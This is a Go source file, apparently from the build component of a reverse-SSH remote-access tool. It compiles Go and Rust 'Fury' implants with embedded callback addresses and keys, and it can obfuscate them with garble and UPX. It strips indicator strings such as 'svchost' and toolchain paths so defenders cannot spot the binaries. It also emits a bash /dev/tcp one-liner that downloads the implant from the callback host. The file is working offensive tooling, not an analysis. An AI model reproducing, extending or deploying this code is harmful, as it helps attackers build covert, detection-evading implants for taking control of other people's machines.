package webserver

import (
	"bytes"
	"io"
	"compress/gzip"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strconv"
	"strings"

	"github.com/NHAS/reverse_ssh/internal"
	"github.com/NHAS/reverse_ssh/internal/server/data"
	"github.com/NHAS/reverse_ssh/pkg/logger"
	"github.com/NHAS/reverse_ssh/pkg/trie"
	"golang.org/x/crypto/ssh"
)

var (
	Autocomplete = trie.NewTrie()

	cachePath string

	validPlatforms = make(map[string]bool)
	validArchs     = make(map[string]bool)

	validArtifactName     = regexp.MustCompile(`^[A-Za-z0-9._-]{1,128}$`)
	validWorkingDirectory = regexp.MustCompile(`^[A-Za-z0-9_./~:@+\\ -]{1,255}$`)
	singleTokenBuildValue = regexp.MustCompile(`^[^\s\x00-\x1f\x7f]+$`)

	allowedModuleBuildTags = map[string]struct{}{
		"pscan":   {},
		"execass": {},
	}
)

type BuildConfig struct {
	Name, Comment, Owners string

	GOOS, GOARCH, GOARM string

	ConnectBackAdress, Fingerprint string

	Proxy, SNI, LogLevel string

	UseKerberosAuth bool

	SharedLibrary   bool
	UPX             bool
	Lzma            bool
	Garble          bool
	Fury            bool
	DisableLibC     bool
	RawDownload     bool
	UseHostHeader   bool
	NoHistorySave   bool
	BusyBoxFallback bool
	BuildTags       []string

	WorkingDirectory string

	NTLMProxyCreds string

	VersionString string
}

func Build(config BuildConfig) (string, error) {
	if !webserverOn {
		return "", errors.New("web server is not enabled")
	}
	if err := validateBuildConfig(config); err != nil {
		return "", err
	}
	buildTags, err := normalizeModuleBuildTags(config.BuildTags)
	if err != nil {
		return "", err
	}
	config.BuildTags = buildTags

	if len(config.GOARCH) != 0 && !validArchs[config.GOARCH] {
		return "", fmt.Errorf("GOARCH supplied is not valid: %s", config.GOARCH)
	}

	if len(config.GOOS) != 0 && !validPlatforms[config.GOOS] {
		return "", fmt.Errorf("GOOS supplied is not valid: %s", config.GOOS)
	}

	if len(config.Fingerprint) == 0 {
		config.Fingerprint = defaultFingerPrint
	}

	if config.UPX {
		_, err := exec.LookPath("upx")
		if err != nil {
			return "", errors.New("upx could not be found in PATH")
		}
	}

	buildTool := "go"
	if config.Garble {
		_, err := exec.LookPath("garble")
		if err != nil {
			return "", errors.New("garble could not be found in PATH")
		}
		buildTool = "garble"
	}

	var f data.Download
	f.WorkingDirectory = config.WorkingDirectory
	f.CallbackAddress = config.ConnectBackAdress
	f.UseHostHeader = config.UseHostHeader

	filename, err := internal.RandomString(16)
	if err != nil {
		return "", err
	}

	if len(config.Name) == 0 {
		config.Name, err = internal.RandomString(16)
		if err != nil {
			return "", err
		}
	}

	f.Goos = runtime.GOOS
	if len(config.GOOS) > 0 {
		f.Goos = config.GOOS
	}

	f.Goarch = runtime.GOARCH
	if len(config.GOARCH) > 0 {
		f.Goarch = config.GOARCH
	}

	f.Goarm = config.GOARM

	if config.Fury {
		if err := validateFuryBuildConfig(config, f.Goos, f.Goarch); err != nil {
			return "", err
		}
	}

	f.FilePath = filepath.Join(cachePath, filename)
	f.FileType = "executable"
	f.Version = internal.Version + "_guess"

	repoVersion, err := exec.Command("git", "describe", "--tags").CombinedOutput()
	if err == nil {
		f.Version = string(repoVersion)
	}

	var buildArguments []string
	if config.Garble {
		buildArguments = append(buildArguments, "-tiny", "-literals")
	}

	buildArguments = append(buildArguments, "build", "-trimpath")
	var cleanupBusyBoxOverlay func()
	if config.BusyBoxFallback && !config.Fury {
		busyBoxOverlay, cleanup, err := prepareBusyBoxOverlay(f.Goos, f.Goarch)
		if err != nil {
			return "", err
		}
		cleanupBusyBoxOverlay = cleanup
		defer cleanupBusyBoxOverlay()
		buildArguments = append(buildArguments, "-overlay", busyBoxOverlay)
	}

	if config.SharedLibrary {
		buildArguments = append(buildArguments, "-buildmode=c-shared")
		f.FileType = "shared-object"
		if f.Goos != "windows" {
			f.FilePath += ".so"
		} else {
			f.FilePath += ".dll"
		}

	}
	goBuildTags := append([]string(nil), config.BuildTags...)
	if config.SharedLibrary {
		goBuildTags = append(goBuildTags, "cshared")
	}
	if len(goBuildTags) > 0 {
		buildArguments = append(buildArguments, "-tags="+strings.Join(goBuildTags, ","))
	}

	newPrivateKey, err := internal.GeneratePrivateKey()
	if err != nil {
		return "", err
	}

	sshPriv, err := ssh.ParsePrivateKey(newPrivateKey)
	if err != nil {
		return "", err
	}
	lastBuiltClientStableID = internal.FingerprintSHA1Hex(sshPriv.PublicKey())

	publicKeyBytes := ssh.MarshalAuthorizedKey(sshPriv.PublicKey())
	embeddedPrivateKeyB64 := base64.StdEncoding.EncodeToString(newPrivateKey)

	_, err = logger.StrToUrgency(config.LogLevel)
	if err != nil {
		return "", err
	}

	// Fury: build the Rust implant instead of the Go client. Requires a Rust
	// toolchain (cargo) with the needed targets installed next to the server.
	if config.Fury {
		return buildFury(config, f, embeddedPrivateKeyB64, string(publicKeyBytes))
	}

	buildArguments = append(buildArguments, fmt.Sprintf("-ldflags=-s -w -X main.logLevel=%s -X main.destination=%s -X main.fingerprint=%s -X main.proxy=%s -X main.customSNI=%s -X main.useHostKerberos=%t -X main.noHistorySave=%t -X main.busyBoxFallback=%t -X main.ntlmProxyCreds=%s -X main.versionString=%s -X github.com/NHAS/reverse_ssh/internal.Version=%s -X github.com/NHAS/reverse_ssh/internal/client/keys.EmbeddedPrivateKeyBase64=%s", config.LogLevel, config.ConnectBackAdress, config.Fingerprint, config.Proxy, config.SNI, config.UseKerberosAuth, config.NoHistorySave, config.BusyBoxFallback, config.NTLMProxyCreds, strings.TrimSpace(config.VersionString), strings.TrimSpace(f.Version), embeddedPrivateKeyB64))
	buildArguments = append(buildArguments, "-o", f.FilePath, filepath.Join(projectRoot, "/cmd/client"))

	cmd := exec.Command(buildTool, buildArguments...)

	if config.DisableLibC {
		cmd.Env = append(os.Environ(), "CGO_ENABLED=0")
	}

	cmd.Env = append(cmd.Env, os.Environ()...)
	cmd.Env = append(cmd.Env, "GOTOOLCHAIN=go1.24.5+auto")
	cmd.Env = append(cmd.Env, "GOOS="+f.Goos)
	cmd.Env = append(cmd.Env, "GOARCH="+f.Goarch)
	if len(f.Goarm) != 0 {
		cmd.Env = append(cmd.Env, "GOARM="+f.Goarm)
	}
	cmd.Env = appendDefaultMIPSEnv(cmd.Env, f.Goarch)

	//Building a shared object for windows needs some extra beans
	cgoOn := "0"
	if config.SharedLibrary {

		var crossCompiler string
		if (runtime.GOOS == "linux" || runtime.GOOS == "darwin") && f.Goos == "windows" {
			crossCompiler = "x86_64-w64-mingw32-gcc"
			if f.Goarch == "386" {
				crossCompiler = "i686-w64-mingw32-gcc"
			}
		}

		cmd.Env = append(cmd.Env, "CC="+crossCompiler)
		cgoOn = "1"
	}

	cmd.Env = append(cmd.Env, "CGO_ENABLED="+cgoOn)

	output, err := cmd.CombinedOutput()
	if err != nil {
		if strings.Contains(err.Error(), "garble") && (strings.Contains(err.Error(), "i686-w64-mingw32-ld") || strings.Contains(err.Error(), "x86_64-w64-mingw32-ld")) &&
			strings.Contains(err.Error(), "undefined reference to") {
			// Try to recover if the linking fails by clearing the cache
			if cleanErr := exec.Command("go", "clean", "-cache").Run(); cleanErr != nil {
				return "", fmt.Errorf("error (was unable to automatically clean cache): %s\n%s", err.Error(), string(output))
			}
			output, err = cmd.CombinedOutput()
			if err != nil {
				return "", fmt.Errorf("error: %s\n%s", err.Error(), string(output))
			}
		} else {
			return "", fmt.Errorf("error: %s\n%s", err.Error(), string(output))
		}
	}

	f.UrlPath = config.Name

	if config.Lzma && !config.UPX {
		return "", errors.New("Cannot use --lzma without --upx")
	}

	if config.UPX {
		upxArgs := []string{"-qq", "-f", f.FilePath}

		if config.Lzma {
			upxArgs = append([]string{"--lzma"}, upxArgs...)
		}

		output, err := exec.Command("upx", upxArgs...).CombinedOutput()
		if err != nil {
			return "", errors.New("unable to run upx: " + err.Error() + ": " + string(output))
		}
	}

	fi, err := os.Stat(f.FilePath)
	if err != nil {
		fmt.Println("Error: ", err)
	}
	f.FileSize = float64(fi.Size()) / 1024 / 1024

	os.Chmod(f.FilePath, 0600)

	f.LogLevel = config.LogLevel

	err = data.CreateDownload(f)
	if err != nil {
		return "", err
	}

	Autocomplete.Add(config.Name)

	authorizedControlleeKeys, err := os.OpenFile(filepath.Join(cachePath, "../authorized_controllee_keys"), os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		return "", errors.New("cant open authorized controllee keys file: " + err.Error())
	}
	defer authorizedControlleeKeys.Close()

	if _, err = authorizedControlleeKeys.WriteString(fmt.Sprintf("%s %s %s\n", "owner="+strconv.Quote(config.Owners), publicKeyBytes[:len(publicKeyBytes)-1], config.Comment)); err != nil {
		return "", errors.New("cant write newly generated key to authorized controllee keys file: " + err.Error())
	}

	if config.RawDownload {

		host, port, err := net.SplitHostPort(f.CallbackAddress)
		if err != nil {
			return fmt.Sprintf(`bash -c "exec 3<>/dev/tcp/HOSTHERE/PORT_HERE; echo RAW%[1]s>&3; cat <&3" > %[1]s`, config.Name), nil
		}

		return fmt.Sprintf(`bash -c "exec 3<>/dev/tcp/%s/%s; echo RAW%[3]s>&3; cat <&3" > %[3]s`, host, port, config.Name), nil
	}

	return "http://" + DefaultConnectBack + "/" + config.Name, nil
}

var furyIOCs = []string{
	"Users/", ".cargo", ".rustup", "wrssh", "russh", "keepalive-rssh",
	"reverse_ssh", "svchost", "conpty", "ssh_client", "index.crates.io",
	"src/hd/", "src/ev/", "src/pt/", "vendor/",
}

func sanitizeFuryBinary(path string) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	hashRe := regexp.MustCompile(`/rustc/[0-9a-f]{40}`)
	patched := hashRe.ReplaceAll(data, []byte("/rustc/"+strings.Repeat("0", 40)))
	hbRe := regexp.MustCompile("/private/tmp/rust-[0-9A-Za-z_-]+/rustc-[0-9.]+-src/vendor/[^\\x00]*?\\.rs")
	patched = hbRe.ReplaceAllFunc(patched, func(m []byte) []byte {
		return []byte("/s" + strings.Repeat("0", len(m)-2))
	})

	regRe := regexp.MustCompile("(?:/[a-z0-9]{1,8}/)?index\\.crates\\.io-[0-9a-f]{8,32}[-/][A-Za-z0-9_.-]+-[0-9]+\\.[0-9]+\\.[0-9]+[^\\x00]*?\\.rs")
	patched = regRe.ReplaceAllFunc(patched, func(m []byte) []byte {
		return []byte("/r" + strings.Repeat("0", len(m)-2))
	})
	if len(patched) != len(data) {
		return errors.New("post-build patch changed binary size")
	}
	lower := strings.ToLower(string(patched))
	for _, ioc := range furyIOCs {
		if strings.Contains(lower, strings.ToLower(ioc)) {
			return fmt.Errorf("IOC leaked into binary: %q", ioc)
		}
	}
	if m := regexp.MustCompile(`/rustc/[0-9a-f]{8}`).FindString(lower); m != "" && !strings.Contains(lower, "/rustc/"+strings.Repeat("0", 40)) {
		return fmt.Errorf("compiler hash leaked into binary: %q", m)
	}
	return os.WriteFile(path, patched, 0600)
}

func moveFile(src, dst string) error {
	if err := os.Rename(src, dst); err == nil {
		return nil
	}
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	if _, err := io.Copy(out, in); err != nil {
		return err
	}
	return os.Remove(src)
}

func validateFuryBuildConfig(config BuildConfig, goos, goarch string) error {
	switch goos {
	case "windows", "linux", "darwin":
	default:
		return fmt.Errorf("fury supports windows, linux and darwin, not %q", goos)
	}
	switch goarch {
	case "amd64", "arm64", "386":
	default:
		return fmt.Errorf("fury supports amd64, arm64 and 386, not %q", goarch)
	}
	if config.Garble {
		return errors.New("garble applies to Go builds only and cannot be combined with fury")
	}
	if config.SharedLibrary {
		return errors.New("shared object builds are not supported for fury")
	}
	if config.BusyBoxFallback {
		return errors.New("busybox fallback is not supported for fury")
	}
	if len(config.BuildTags) > 0 {
		return fmt.Errorf("module build tags (%s) are not supported for fury", strings.Join(config.BuildTags, ", "))
	}
	if _, err := exec.LookPath("cargo"); err != nil {
		return errors.New("cargo could not be found in PATH (required for fury builds)")
	}
	return nil
}

type goBuildOverlay struct {
	Replace map[string]string `json:"Replace"`
}

func buildFury(config BuildConfig, f data.Download, embeddedPrivateKeyB64 string, publicKeyBytes string) (string, error) {
	furyDir := filepath.Join(projectRoot, "fury")
	if info, err := os.Stat(furyDir); err != nil || !info.IsDir() {
		return "", errors.New("fury source directory not found next to the server")
	}

	if _, err := exec.LookPath("cargo"); err != nil {
		return "", errors.New("cargo could not be found in PATH (required for fury builds)")
	}

	var cargoArgs []string
	outRel := "target/release/svc"
	switch {
	case f.Goos == "windows" && f.Goarch == "386":
		cargoArgs = append(cargoArgs, "--target", "i686-pc-windows-gnu")
		outRel = "target/i686-pc-windows-gnu/release/svc.exe"
		f.FilePath += ".exe"
	case f.Goos == "windows" && f.Goarch == "arm64":
		cargoArgs = append(cargoArgs, "--target", "aarch64-pc-windows-gnullvm")
		outRel = "target/aarch64-pc-windows-gnullvm/release/svc.exe"
		f.FilePath += ".exe"
	case f.Goos == "windows":
		cargoArgs = append(cargoArgs, "--target", "x86_64-pc-windows-gnu")
		outRel = "target/x86_64-pc-windows-gnu/release/svc.exe"
		f.FilePath += ".exe"
	case f.Goos == "linux" && f.Goarch == "arm64":
		cargoArgs = append(cargoArgs, "--target", "aarch64-unknown-linux-gnu")
		outRel = "target/aarch64-unknown-linux-gnu/release/svc"
	case f.Goos == "linux" && f.Goarch == "amd64":
		cargoArgs = append(cargoArgs, "--target", "x86_64-unknown-linux-gnu")
		outRel = "target/x86_64-unknown-linux-gnu/release/svc"
	}

	cargoPath, err := exec.LookPath("cargo")
	if err != nil {
		return "", errors.New("cargo could not be found in PATH")
	}
	// cargo is often a rustup shim; make toolchain/home resolution deterministic
	// regardless of how the server process was launched.
	homeDir, _ := os.UserHomeDir()
	env := os.Environ()
	setEnvDefault := func(key, value string) {
		if value == "" {
			return
		}
		for _, kv := range env {
			if strings.HasPrefix(kv, key+"=") {
				return
			}
		}
		env = append(env, key+"="+value)
	}
	setEnvDefault("RUSTUP_HOME", filepath.Join(homeDir, ".rustup"))
	setEnvDefault("CARGO_HOME", filepath.Join(homeDir, ".cargo"))
	env = append(env,
		"PATH="+filepath.Join(homeDir, ".cargo/bin")+string(os.PathListSeparator)+os.Getenv("PATH"),
		"FURY_KEY_B64="+embeddedPrivateKeyB64,
		"FURY_DEST="+config.ConnectBackAdress,
		"FURY_FINGERPRINT="+config.Fingerprint,
		"GOTOOLCHAIN=go1.24.5+auto",
		// dependencies are pre-fetched into the image (docker/*/Dockerfile),
		// keep runtime builds offline-safe
		"CARGO_NET_OFFLINE=true",
	)

	cmd := exec.Command(cargoPath, append([]string{"build", "--release", "--locked"}, cargoArgs...)...)
	cmd.Dir = furyDir
	cmd.Env = env
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("fury build error: %s\n%s", err.Error(), string(output))
	}

	builtPath := filepath.Join(furyDir, outRel)
	if err := sanitizeFuryBinary(builtPath); err != nil {
		return "", fmt.Errorf("fury post-build failed: %w", err)
	}
	if err := moveFile(builtPath, f.FilePath); err != nil {
		return "", fmt.Errorf("fury build output move failed: %w", err)
	}

	fi, err := os.Stat(f.FilePath)
	if err != nil {
		return "", err
	}
	f.FileSize = float64(fi.Size()) / 1024 / 1024
	f.FileType = "executable"
	f.Version = strings.TrimSpace(f.Version) + "-fury"
	f.UrlPath = config.Name

	if err := os.Chmod(f.FilePath, 0600); err != nil {
		return "", err
	}
	f.LogLevel = config.LogLevel

	if err := data.CreateDownload(f); err != nil {
		return "", err
	}

	Autocomplete.Add(config.Name)

	authorizedControlleeKeys, err := os.OpenFile(filepath.Join(cachePath, "../authorized_controllee_keys"), os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		return "", errors.New("cant open authorized controllee keys file: " + err.Error())
	}
	defer authorizedControlleeKeys.Close()

	if _, err = authorizedControlleeKeys.WriteString(fmt.Sprintf("%s %s %s\n", "owner="+strconv.Quote(config.Owners), publicKeyBytes[:len(publicKeyBytes)-1], config.Comment)); err != nil {
		return "", errors.New("cant write newly generated key to authorized controllee keys file: " + err.Error())
	}

	if config.RawDownload {
		host, port, err := net.SplitHostPort(f.CallbackAddress)
		if err != nil {
			return fmt.Sprintf(`bash -c "exec 3<>/dev/tcp/HOSTHERE/PORT_HERE; echo RAW%[1]s>&3; cat <&3" > %[1]s`, config.Name), nil
		}
		return fmt.Sprintf(`bash -c "exec 3<>/dev/tcp/%s/%s; echo RAW%[3]s>&3; cat <&3" > %[3]s`, host, port, config.Name), nil
	}

	return "http://" + DefaultConnectBack + "/" + config.Name, nil
}

func prepareBusyBoxOverlay(goos, goarch string) (string, func(), error) {
	if goos != "linux" {
		return "", nil, errors.New("busybox fallback can only be embedded into linux artifacts")
	}

	sourcePath, err := findBusyBoxBinary(goarch)
	if err != nil {
		return "", nil, err
	}

	sourceBytes, err := os.ReadFile(sourcePath)
	if err != nil {
		return "", nil, fmt.Errorf("read busybox fallback binary %q: %w", sourcePath, err)
	}
	if len(sourceBytes) == 0 {
		return "", nil, fmt.Errorf("busybox fallback binary %q is empty", sourcePath)
	}

	compressed, err := gzipBytes(sourceBytes)
	if err != nil {
		return "", nil, err
	}

	tempDir, err := os.MkdirTemp("", "wrssh-busybox-overlay-*")
	if err != nil {
		return "", nil, fmt.Errorf("create busybox overlay temp dir: %w", err)
	}
	cleanup := func() {
		_ = os.RemoveAll(tempDir)
	}

	generatedSourcePath := filepath.Join(tempDir, "embedded.go")
	if err := os.WriteFile(generatedSourcePath, generatedBusyBoxSource(compressed), 0600); err != nil {
		cleanup()
		return "", nil, fmt.Errorf("write busybox overlay source: %w", err)
	}

	overlayPath := filepath.Join(tempDir, "overlay.json")
	overlay := goBuildOverlay{
		Replace: map[string]string{
			filepath.Join(projectRoot, "internal/client/busybox/embedded.go"): generatedSourcePath,
		},
	}
	overlayBytes, err := json.Marshal(overlay)
	if err != nil {
		cleanup()
		return "", nil, fmt.Errorf("encode busybox overlay: %w", err)
	}
	if err := os.WriteFile(overlayPath, overlayBytes, 0600); err != nil {
		cleanup()
		return "", nil, fmt.Errorf("write busybox overlay: %w", err)
	}

	return overlayPath, cleanup, nil
}

func findBusyBoxBinary(goarch string) (string, error) {
	envKey := "RSSH_BUSYBOX_" + strings.ToUpper(strings.ReplaceAll(goarch, "-", "_")) + "_PATH"
	candidates := []string{
		strings.TrimSpace(os.Getenv(envKey)),
		strings.TrimSpace(os.Getenv("RSSH_BUSYBOX_PATH")),
		filepath.Join("/usr/local/share/wrssh/busybox", "linux-"+goarch),
		filepath.Join("/usr/local/share/wrssh/busybox", "busybox-"+goarch),
		filepath.Join("/usr/local/bin", "busybox-"+goarch),
	}

	if runtime.GOOS == "linux" && runtime.GOARCH == goarch {
		candidates = append(candidates, "/bin/busybox", "/usr/bin/busybox")
	}

	for _, candidate := range candidates {
		if candidate == "" {
			continue
		}
		info, err := os.Stat(candidate)
		if err == nil && !info.IsDir() {
			return candidate, nil
		}
	}

	return "", fmt.Errorf("busybox fallback requested for linux/%s, but no busybox binary was found; set %s or RSSH_BUSYBOX_PATH", goarch, envKey)
}

func gzipBytes(input []byte) ([]byte, error) {
	var output bytes.Buffer
	writer, err := gzip.NewWriterLevel(&output, gzip.BestCompression)
	if err != nil {
		return nil, fmt.Errorf("create busybox gzip writer: %w", err)
	}
	if _, err := writer.Write(input); err != nil {
		_ = writer.Close()
		return nil, fmt.Errorf("compress busybox fallback: %w", err)
	}
	if err := writer.Close(); err != nil {
		return nil, fmt.Errorf("finish busybox fallback compression: %w", err)
	}
	return output.Bytes(), nil
}

func generatedBusyBoxSource(compressed []byte) []byte {
	var output bytes.Buffer
	output.WriteString("package busybox\n\n")
	output.WriteString("var embeddedGzip = []byte{\n")
	for i, value := range compressed {
		if i%12 == 0 {
			output.WriteString("\t")
		}
		output.WriteString(fmt.Sprintf("0x%02x,", value))
		if i%12 == 11 {
			output.WriteString("\n")
		} else {
			output.WriteByte(' ')
		}
	}
	if len(compressed)%12 != 0 {
		output.WriteString("\n")
	}
	output.WriteString("}\n")
	return output.Bytes()
}

func appendDefaultMIPSEnv(env []string, goarch string) []string {
	switch goarch {
	case "mips", "mipsle":
		if !envHasKey(env, "GOMIPS") {
			env = append(env, "GOMIPS=softfloat")
		}
	case "mips64", "mips64le":
		if !envHasKey(env, "GOMIPS64") {
			env = append(env, "GOMIPS64=softfloat")
		}
	}
	return env
}

func envHasKey(env []string, key string) bool {
	prefix := key + "="
	for _, item := range env {
		if strings.HasPrefix(item, prefix) {
			return true
		}
	}
	return false
}

func startBuildManager(_cachePath string) error {

	clientSource := filepath.Join(projectRoot, "/cmd/client")
	info, err := os.Stat(clientSource)
	if err != nil || !info.IsDir() {
		return fmt.Errorf("the server doesnt appear to be in {project_root}/bin, please put it there")
	}

	cmd := exec.Command("go", "tool", "dist", "list")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("unable to run the go compiler to get a list of compilation targets: %s", err)
	}

	platformAndArch := bytes.Split(output, []byte("\n"))

	for _, line := range platformAndArch {
		parts := bytes.Split(line, []byte("/"))
		if len(parts) == 2 {
			validPlatforms[string(parts[0])] = true
			validArchs[string(parts[1])] = true
		}
	}

	info, err = os.Stat(_cachePath)
	if os.IsNotExist(err) {
		err = os.Mkdir(_cachePath, 0700)
		if err != nil {
			return err
		}
		info, err = os.Stat(_cachePath)
		if err != nil {
			return err
		}
	}

	if !info.IsDir() {
		return errors.New("Filestore path '" + _cachePath + "' already exists, but is a file instead of directory")
	}

	cachePath = _cachePath

	return nil
}

func validateBuildConfig(config BuildConfig) error {
	config.Name = strings.TrimSpace(config.Name)
	config.Comment = strings.TrimSpace(config.Comment)
	config.Owners = strings.TrimSpace(config.Owners)
	config.Proxy = strings.TrimSpace(config.Proxy)
	config.SNI = strings.TrimSpace(config.SNI)
	config.ConnectBackAdress = strings.TrimSpace(config.ConnectBackAdress)
	config.NTLMProxyCreds = strings.TrimSpace(config.NTLMProxyCreds)
	config.VersionString = strings.TrimSpace(config.VersionString)
	config.WorkingDirectory = strings.TrimSpace(config.WorkingDirectory)

	if config.Name != "" && !validArtifactName.MatchString(config.Name) {
		return errors.New("artifact name may only contain letters, numbers, '.', '_' and '-'")
	}
	if hasControlCharacters(config.Comment) {
		return errors.New("artifact comment must be a single line without control characters")
	}
	if hasControlCharacters(config.Owners) {
		return errors.New("artifact owners must not contain control characters")
	}
	if config.WorkingDirectory != "" && !validWorkingDirectory.MatchString(config.WorkingDirectory) {
		return errors.New("working directory contains unsupported characters")
	}
	if _, err := normalizeModuleBuildTags(config.BuildTags); err != nil {
		return err
	}
	for field, value := range map[string]string{
		"callback address": config.ConnectBackAdress,
		"proxy":            config.Proxy,
		"sni":              config.SNI,
		"ntlm proxy creds": config.NTLMProxyCreds,
		"version string":   config.VersionString,
		"log level":        config.LogLevel,
		"fingerprint":      config.Fingerprint,
	} {
		if value == "" {
			continue
		}
		if !singleTokenBuildValue.MatchString(value) {
			return fmt.Errorf("%s must not contain spaces or control characters", field)
		}
	}
	return nil
}

func normalizeModuleBuildTags(tags []string) ([]string, error) {
	seen := make(map[string]struct{}, len(tags))
	for _, tag := range tags {
		tag = strings.ToLower(strings.TrimSpace(tag))
		if tag == "" {
			continue
		}
		if _, ok := allowedModuleBuildTags[tag]; !ok {
			return nil, fmt.Errorf("unsupported module build tag %q", tag)
		}
		seen[tag] = struct{}{}
	}

	result := make([]string, 0, len(seen))
	for tag := range seen {
		result = append(result, tag)
	}
	sort.Strings(result)
	return result, nil
}

func hasControlCharacters(value string) bool {
	for _, r := range value {
		if r < 32 || r == 127 {
			return true
		}
	}
	return false
}
